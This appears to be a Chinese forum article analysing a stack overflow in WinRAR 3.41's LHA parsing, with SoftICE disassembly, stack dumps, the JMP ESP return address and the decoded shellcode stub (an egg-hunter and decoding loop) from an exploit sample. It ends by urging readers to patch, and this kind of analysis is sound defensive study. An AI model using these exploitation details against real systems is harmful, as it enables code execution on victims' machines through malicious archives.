
# 来看看 WINRAR 溢出漏洞吧,写个 SHELLCODE 就可以捆绑程序【注意】

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-477.htm`](https://www.pediy.com/kssd/pediy08/pediy8-477.htm)

这个地址是那个漏洞的介绍:

`http://star.elife.com.cn/article/2006/0725/A20060725144447.shtml`

下面是我分析它溢出部分的程序.版本 3.41【只要 3.60 以下,这个子程序是一样的,只是地址有变化】

分析环境 `WINDOWS 2000`

调试软件 `SOFTICE`

`WINRAR 3.41`

中间有些程序部分,因为不是溢出关键地方省去了

这个是处理 `LHA` 文件的部分。溢出是由他造成的。

```asm
001B:016B2828  53                  PUSH      EBX
001B:016B2829  56                  PUSH      ESI
001B:016B282A  57                  PUSH      EDI
001B:016B282B  55                  PUSH      EBP
```

进入子程序运行到此的堆栈

```
0023:001237A8  001238E4  001249B0  00997DA4  001238F4      .8...I...}...8..
               返回地址
               --------
0023:001237B8  016B1F41  00123D80  00000000  00000000      A.k..=..........
```

```asm
001B:016B282C  81C404F0FFFF        ADD       ESP,FFFFF004
001B:016B2832  50                  PUSH      EAX
001B:016B2833  81C4F4FBFFFF        ADD       ESP,FFFFFBF4
001B:016B2839  8BDA                MOV       EBX,EDX
001B:016B283B  890424              MOV       [ESP],EAX
```

运行到此处的堆栈内容

`:dd esp l20`

```
0023:0012239C  016BC5E0  00000000  00000000  00000000      ..k.............
0023:001223AC  00000000  00000000  00000000  00000000      ................
```

```asm
001B:016B283E  BF1C136C01          MOV       EDI,016C131C
001B:016B2843  33C0                XOR       EAX,EAX
001B:016B2B00  8A0A                MOV       CL,[EDX]
001B:016B2B02  81E1FF000000        AND       ECX,000000FF
001B:016B2B08  49                  DEC       ECX
001B:016B2B09  740D                JZ        016B2B18------->copy 数据
001B:016B2B0B  49                  DEC       ECX      
001B:016B2B0C  7437                JZ        016B2B45------->copy 数据
001B:016B2B0E  83E93E              SUB       ECX,3E
001B:016B2B11  747A                JZ        016B2B8D
001B:016B2B13  E991000000          JMP       016B2BA9
001B:016B2B18  81FE00010000        CMP       ESI,00000100
001B:016B2B1E  7C05                JL        016B2B25
001B:016B2B20  BEFF000000          MOV       ESI,000000FF
001B:016B2B25  33C0                XOR       EAX,EAX
001B:016B2B27  EB0E                JMP       016B2B37
001B:016B2B29  8B17                MOV       EDX,[EDI]
001B:016B2B2B  8A0A                MOV       CL,[EDX]
001B:016B2B2D  80E1FF              AND       CL,FF
001B:016B2B30  884C0316            MOV       [EAX+EBX+16],CL
001B:016B2B34  FF07                INC       DWORD PTR [EDI]
001B:016B2B36  40                  INC       EAX
001B:016B2B37  8D56FD              LEA       EDX,[ESI-03]
001B:016B2B3A  3BC2                CMP       EAX,EDX
001B:016B2B3C  7CEB                JL        016B2B29
001B:016B2B3E  C644331300          MOV       BYTE PTR [ESI+EBX+13],00
001B:016B2B43  EB6B                JMP       016B2BB0
001B:016B2B45  81FE00040000        CMP       ESI,00000400----->这里的长度竟然可以是 1023
001B:016B2B4B  7C05                JL        016B2B52--------->这个长度是致命，溢出
001B:016B2B4D  BEFF030000          MOV       ESI,000003FF     ；3.61 后的版本把这里去掉了
001B:016B2B52  33C0                XOR       EAX,EAX          ；所以也就不溢出了
001B:016B2B54  EB11                JMP       016B2B67
001B:016B2B56  8B17                MOV       EDX,[EDI]
001B:016B2B58  8A0A                MOV       CL,[EDX]
001B:016B2B5A  80E1FF              AND       CL,FF
001B:016B2B5D  888C040C100000      MOV       [EAX+ESP+0000100C],CL
001B:016B2B64  FF07                INC       DWORD PTR [EDI]
001B:016B2B66  40                  INC       EAX
001B:016B2B67  8D56FD              LEA       EDX,[ESI-03]
001B:016B2B6A  3BC2                CMP       EAX,EDX
001B:016B2B6C  7CE8                JL        016B2B56
001B:016B2B6E  C684340910000000    MOV       BYTE PTR [ESI+ESP+00001009],00
001B:016B2B76  8D84240C100000      LEA       EAX,[ESP+0000100C]
001B:016B2B7D  B25C                MOV       DL,5C
001B:016B2B7F  E8E8FBFFFF          CALL      016B276C
001B:016B2B84  83C6FD              ADD       ESI,-03
001B:016B2B87  89742404            MOV       [ESP+04],ESI
001B:016B2B8B  EB23                JMP       016B2BB0
001B:016B2B8D  8A8319010000        MOV       AL,[EBX+00000119]
001B:016B2B93  3C4D                CMP       AL,4D
001B:016B2BE8  880B                MOV       [EBX],CL
001B:016B2BEA  837C240400          CMP       DWORD PTR [ESP+04],00
001B:016B2BEF  7429                JZ        016B2C1A
001B:016B2BF1  8D7316              LEA       ESI,[EBX+16]
001B:016B2BF4  56                  PUSH      ESI------>str1
001B:016B2BF5  8D842410100000      LEA       EAX,[ESP+00001010]
001B:016B2BFC  50                  PUSH      EAX------>str2
001B:016B2BFD  E8FE190000          CALL      016B4600----->合并串把 str1+str2->str1
001B:016B2C02  83C408              ADD       ESP,08
001B:016B2C05  8D94240C100000      LEA       EDX,[ESP+0000100C]
001B:016B2C0C  52                  PUSH      EDX         不能溢出的等于 000002AA
001B:016B2C0D  56                  PUSH      ESI         str1 长度等于 000004E3
001B:016B2C0E  E8291A0000          CALL      016B463C---->堆栈溢出位置
```

这个地方是堆栈溢出的地方，他没有判断长度，所以才导致溢出

在 3.61 之后,在这里加了一个长度限制,最长 255,所以就保险了

```asm
001B:016B2C13  83C408              ADD       ESP,08
001B:016B2C16  036C2404            ADD       EBP,[ESP+04]
001B:016B2C1A  33C0                XOR       EAX,EAX
001B:016B2C1C  3BE8                CMP       EBP,EAX
001B:016B2C1E  7E15                JLE       016B2C35
001B:016B2C20  33D2                XOR       EDX,EDX
001B:016B2C22  8A540316            MOV       DL,[EAX+EBX+16]
001B:016B2C26  83FA2F              CMP       EDX,2F
001B:016B2C29  7505                JNZ       016B2C30
001B:016B2C2B  C64403165C          MOV       BYTE PTR [EAX+EBX+16],5C
001B:016B2C30  40                  INC       EAX
001B:016B2C31  3BE8                CMP       EBP,EAX
001B:016B2C33  7FEB                JG        016B2C20
001B:016B2C35  8D4316              LEA       EAX,[EBX+16]
001B:016B2C38  50                  PUSH      EAX
001B:016B2C39  50                  PUSH      EAX
001B:016B2C3A  E835890000          CALL      USER32!OemToCharA
001B:016B2C3F  B001                MOV       AL,01
001B:016B2C41  81C40C140000        ADD       ESP,0000140C
```

运行此处时的堆栈已经变成这样了。

`:dd esp l 30`

```
0023:001237A8  9241974B  49934146  90494E96  4B924545      K.A.FA.I.NI.EE.K
               返回地址变成了 7FFA4512,  仔细看一下这个位置是 JMP ESP 可以执行 SHELLCODE 了
               --------
0023:001237B8  7FFA4512  484E9590  4A454E46  964B454E      .E...NHFNEJNEK.
0023:001237C8  42414397  4B494192  41434E41  4A90914E      .CAB.AIKANCAN..J
```

```asm
001B:016B2C47  5D                  POP       EBP
001B:016B2C48  5F                  POP       EDI
001B:016B2C49  5E                  POP       ESI
001B:016B2C4A  5B                  POP       EBX
001B:016B2C4B  C3                  RET
```

\======================这条指令很关键啊====================================

```asm
001B:7FFA4512  FFE4                JMP       ESP   ===1237BC
```

这时的堆栈里面的内容

```
0023:001237BC 90 95 4E 48 46 4E 45 4A-4E 45 4B 96 97 43 41 42  ..NHFNEJNEK..CAB
0023:001237CC 92 41 49 4B 41 4E 43 41-4E 91 90 4A 95 96 41 90  .AIKANCAN..J..A.
```

堆栈里面反汇编后的代码

```asm
001B:001237BC  90                  NOP
001B:001237BD  95                  XCHG      EAX,EBP
001B:001237BE  4E                  DEC       ESI
001B:001237BF  48                  DEC       EAX
001B:001237C0  46                  INC       ESI
001B:001237C1  4E                  DEC       ESI
001B:001237C2  45                  INC       EBP
001B:001237C3  4A                  DEC       EDX
001B:001237C4  4E                  DEC       ESI
001B:001237C5  45                  INC       EBP
001B:001237C6  4B                  DEC       EBX
```



```
001B:001237C7  96                  XCHG      EAX,ESI
001B:001237C8  97                  XCHG      EAX,EDI
001B:001237C9  43                  INC       EBX
001B:001237CA  41                  INC       ECX
001B:001237CB  42                  INC       EDX
001B:001237CC  92                  XCHG      EAX,EDX
001B:001237CD  41                  INC       ECX
001B:001237CE  49                  DEC       ECX
001B:001237CF  4B                  DEC       EBX
001B:001237D0  41                  INC       ECX
001B:001237D1  4E                  DEC       ESI
001B:001237D2  43                  INC       EBX
001B:001237D3  41                  INC       ECX
001B:001237D4  4E                  DEC       ESI
001B:001237D5  91                  XCHG      EAX,ECX
001B:001237D6  90                  NOP
001B:001237D7  4A                  DEC       EDX
001B:001237D8  95                  XCHG      EAX,EBP
001B:001237D9  96                  XCHG      EAX,ESI
001B:001237DA  41                  INC       ECX
001B:001237DB  90                  NOP
001B:001237DC  4E                  DEC       ESI
001B:001237DD  41                  INC       ECX
001B:001237DE  96                  XCHG      EAX,ESI
001B:001237DF  4E                  DEC       ESI
001B:001237E0  49                  DEC       ECX
001B:001237E1  90                  NOP
001B:001237E2  4E                  DEC       ESI
001B:001237E3  41                  INC       ECX
001B:001237E4  45                  INC       EBP
001B:001237E5  4E                  DEC       ESI
001B:001237E6  90                  NOP
001B:001237E7  45                  INC       EBP
001B:001237E8  41                  INC       ECX
001B:001237E9  90                  NOP
001B:001237EA  54                  PUSH      ESP
001B:001237EB  5B                  POP       EBX
001B:001237EC  B856524152          MOV       EAX,52415256
001B:001237F1  40                  INC       EAX
001B:001237F2  43                  INC       EBX
001B:001237F3  3B03                CMP       EAX,[EBX]
001B:001237F5  75FB                JNZ       001237F2
001B:001237F7  83C304              ADD       EBX,04
001B:001237FA  53                  PUSH      EBX
001B:001237FB  33C9                XOR       ECX,ECX
001B:001237FD  66B92009            MOV       CX,0920
001B:00123801  43                  INC       EBX
001B:00123802  803B5C              CMP       BYTE PTR [EBX],5C
001B:00123805  7503                JNZ       0012380A
001B:00123807  8003A3              ADD       BYTE PTR [EBX],A3
001B:0012380A  E2F5                LOOP      00123801
001B:0012380C  C3                  RET
```

希望看到这篇文章的朋友,尽快地打补丁

`4dd466d0e1e0cc123afbe504da2462ca`
